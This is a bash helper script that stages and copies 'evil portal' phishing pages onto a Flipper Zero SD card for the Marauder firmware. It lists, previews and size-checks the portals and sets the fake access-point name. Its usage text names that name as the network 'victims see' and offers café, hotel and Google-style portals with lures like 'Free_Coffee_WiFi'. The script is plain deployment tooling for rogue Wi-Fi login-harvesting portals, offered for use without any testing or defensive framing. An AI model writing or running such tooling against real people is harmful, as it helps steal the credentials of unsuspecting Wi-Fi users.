#!/bin/bash
# Deploy evil portal files to Flipper Zero SD card
# Supports: qFlipper CLI, mounted SD card, or manual copy instructions

PORTALS_DIR="$HOME/Projects/flipper-portals/portals"
FLIPPER_SD_MARAUDER="apps_data/marauder"

usage() {
  echo "╔════════════════════════════════════════╗"
  echo "║   🐬 Flipper Portal Deploy Tool        ║"
  echo "╚════════════════════════════════════════╝"
  echo ""
  echo "Usage: $0 <command> [options]"
  echo ""
  echo "Commands:"
  echo "  list                 List all available portals"
  echo "  preview <file>       Open portal in browser to preview"
  echo "  deploy <file> [name] Copy portal to Flipper SD (+ optional AP name)"
  echo "  deploy-all           Copy ALL portals to Flipper SD"
  echo "  set-ap <name>        Set the AP name (network name victims see)"
  echo "  size <file>          Check if portal is under 20KB limit"
  echo ""
  echo "Examples:"
  echo "  $0 list"
  echo "  $0 preview custom/CafeWiFi.html"
  echo "  $0 deploy custom/CafeWiFi.html \"Free_Coffee_WiFi\""
  echo "  $0 deploy bigbrodude/Google_Modern.html"
  echo "  $0 size custom/HotelGuest.html"
  echo ""
}

find_flipper_sd() {
  for vol in /Volumes/*/; do
    if [ -d "${vol}apps_data" ] || [ -d "${vol}badusb" ] || [ -d "${vol}nfc" ]; then
      echo "$vol"
      return 0
    fi
  done

  if command -v qFlipper &>/dev/null; then
    echo "QFLIPPER"
    return 0
  fi

  echo "NONE"
  return 1
}

list_portals() {
  echo "📂 Available Portals:"
  echo ""
  echo "── Custom (hand-crafted) ──"
  if [ -d "$PORTALS_DIR/custom" ]; then
    for f in "$PORTALS_DIR/custom"/*.html; do
      [ -f "$f" ] || continue
      name=$(basename "$f" .html)
      size=$(wc -c < "$f" | tr -d ' ')
      if [ "$size" -gt 20480 ]; then
        flag="⚠️  ${size}B (>20KB!)"
      else
        flag="✅ ${size}B"
      fi
      echo "   $name  [$flag]"
    done
  fi

  echo ""
  echo "── Premade (bigbrodude6119) ──"
  if [ -d "$PORTALS_DIR/bigbrodude" ]; then
    for f in "$PORTALS_DIR/bigbrodude"/*.html; do
      [ -f "$f" ] || continue
      name=$(basename "$f" .html)
      size=$(wc -c < "$f" | tr -d ' ')
      if [ "$size" -gt 20480 ]; then
        flag="⚠️  ${size}B"
      else
        flag="✅ ${size}B"
      fi
      echo "   $name  [$flag]"
    done
  fi

  echo ""
  echo "── European Portals ──"
  if [ -d "$PORTALS_DIR/european" ]; then
    for dir in "$PORTALS_DIR/european"/*/; do
      [ -d "$dir" ] || continue
      category=$(basename "$dir")
      count=$(ls "$dir"/*.html 2>/dev/null | wc -l | tr -d ' ')
      if [ "$count" -gt 0 ]; then
        echo "   📁 $category/ ($count portals)"
        for f in "$dir"*.html; do
          [ -f "$f" ] || continue
          name=$(basename "$f" .html)
          echo "      └─ $name"
        done
      fi
    done
  fi
}

preview_portal() {
  local file="$PORTALS_DIR/$1"
  if [ ! -f "$file" ]; then
    echo "❌ File not found: $1"
    echo "   Run '$0 list' to see available portals"
    exit 1
  fi
  echo "🌐 Opening $1 in browser..."
  open "$file"
}

check_size() {
  local file="$PORTALS_DIR/$1"
  if [ ! -f "$file" ]; then
    echo "❌ File not found: $1"
    exit 1
  fi
  size=$(wc -c < "$file" | tr -d ' ')
  echo "📏 $(basename "$1"): ${size} bytes"
  if [ "$size" -gt 20480 ]; then
    echo "   ⚠️  OVER 20KB LIMIT! Marauder won't load this."
    echo "   Consider minifying or removing content."
  else
    remaining=$((20480 - size))
    echo "   ✅ Under limit (${remaining} bytes remaining)"
  fi
}

deploy_portal() {
  local file="$PORTALS_DIR/$1"
  local ap_name="${2:-Free_WiFi}"

  if [ ! -f "$file" ]; then
    echo "❌ File not found: $1"
    exit 1
  fi

  size=$(wc -c < "$file" | tr -d ' ')
  if [ "$size" -gt 20480 ]; then
    echo "⚠️  WARNING: $(basename "$1") is ${size} bytes (over 20KB limit)"
    read -p "   Continue anyway? (y/n) " -n 1 -r
    echo
    [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
  fi

  SD=$(find_flipper_sd)

  if [ "$SD" = "NONE" ]; then
    echo ""
    echo "🔍 Flipper SD card not found as mounted volume."
    echo ""
    echo "Options to transfer files:"
    echo ""
    echo "  1. 📱 Use qFlipper (install: brew install --cask qflipper)"
    echo "     Then drag files to SD Card > apps_data > marauder"
    echo ""
    echo "  2. 🌐 Use Flipper Lab (lab.flipper.net) in Chrome"
    echo "     Connect via WebSerial > File Manager > navigate to apps_data/marauder"
    echo ""
    echo "  3. 💾 Remove micro SD from Flipper, use a card reader"
    echo "     Then run: $0 deploy $1 $ap_name"
    echo ""
    echo "📋 Files to copy to SD:/apps_data/marauder/:"
    echo "   - index.html  (your portal page)"
    echo "   - ap.config.txt (contains: $ap_name)"
    echo ""

    local staging="$HOME/Projects/flipper-portals/staging"
    mkdir -p "$staging"
    cp "$file" "$staging/index.html"
    echo "$ap_name" > "$staging/ap.config.txt"
    cp "$file" "$staging/$(basename "$file")"

    echo "✅ Staged files ready at: $staging/"
    echo "   - index.html (active portal)"
    echo "   - ap.config.txt (AP name: $ap_name)"
    echo "   - $(basename "$file") (backup copy)"
    echo ""
    echo "💡 Quick copy when SD is mounted:"
    echo "   cp $staging/* /Volumes/FLIPPER_SD/$FLIPPER_SD_MARAUDER/"
    return
  fi

  if [ "$SD" = "QFLIPPER" ]; then
    echo "🐬 qFlipper detected. Use the GUI to copy files."
    return
  fi

  local target="${SD}${FLIPPER_SD_MARAUDER}"
  mkdir -p "$target"
  cp "$file" "$target/index.html"
  echo "$ap_name" > "$target/ap.config.txt"
  cp "$file" "$target/$(basename "$file")"

  echo "✅ Deployed to Flipper SD!"
  echo "   📄 index.html     → $(basename "$file")"
  echo "   📡 ap.config.txt  → $ap_name"
  echo "   📂 $target/"
}

deploy_all() {
  SD=$(find_flipper_sd)
  local staging="$HOME/Projects/flipper-portals/staging/all-portals"
  mkdir -p "$staging"

  echo "📦 Copying all portals to staging..."
  count=0
  for f in $(find "$PORTALS_DIR" -name "*.html" -type f); do
    rel=${f#$PORTALS_DIR/}
    name=$(echo "$rel" | tr '/' '_')
    cp "$f" "$staging/$name"
    count=$((count + 1))
  done

  echo "✅ $count portals staged at: $staging/"
  echo ""

  if [ "$SD" != "NONE" ] && [ "$SD" != "QFLIPPER" ]; then
    local target="${SD}${FLIPPER_SD_MARAUDER}"
    mkdir -p "$target"
    cp "$staging"/* "$target/"
    echo "✅ All portals copied to Flipper SD: $target/"
  else
    echo "Copy these to your Flipper SD card at: /$FLIPPER_SD_MARAUDER/"
    echo "Use qFlipper, Flipper Lab, or an SD card reader."
  fi
}

case "${1:-}" in
  list)       list_portals ;;
  preview)    preview_portal "$2" ;;
  deploy)     deploy_portal "$2" "${3:-}" ;;
  deploy-all) deploy_all ;;
  set-ap)     echo "$2" > "$HOME/Projects/flipper-portals/staging/ap.config.txt"
              echo "✅ AP name set to: $2" ;;
  size)       check_size "$2" ;;
  *)          usage ;;
esac
